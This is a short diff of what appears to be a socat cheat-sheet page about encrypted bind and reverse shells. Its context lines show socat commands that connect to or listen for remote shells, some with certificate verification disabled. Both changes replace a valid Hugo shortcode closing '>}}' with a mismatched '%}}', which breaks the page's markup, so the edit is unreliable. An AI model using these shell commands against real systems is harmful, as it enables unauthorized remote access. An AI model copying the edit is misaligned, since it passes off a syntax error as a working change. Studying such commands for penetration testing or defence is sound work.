@@ -239,7 +239,7 @@ socat - TCP4:<IP-of-SERVER>:443
 
 ### Encrypted bind shell
 
-To create a certificate, please check [OpenSSL]({{< ref "openssl" >}}).
+To create a certificate, please check [OpenSSL]({{< ref "openssl" %}}).
 
 **Server:**
 
@@ -257,7 +257,7 @@ socat - OPENSSL:10.11.0.4:443,verify=0
 
 **Server:**
 
-Listening for incoming reverse shell serving the certificate created with [OpenSSL]({{< ref "openssl" >}}).
+Listening for incoming reverse shell serving the certificate created with [OpenSSL]({{< ref "openssl" %}}).
 
 ```plain
 sudo socat OPENSSL-LISTEN:443,cert=cert.pem,verify=0
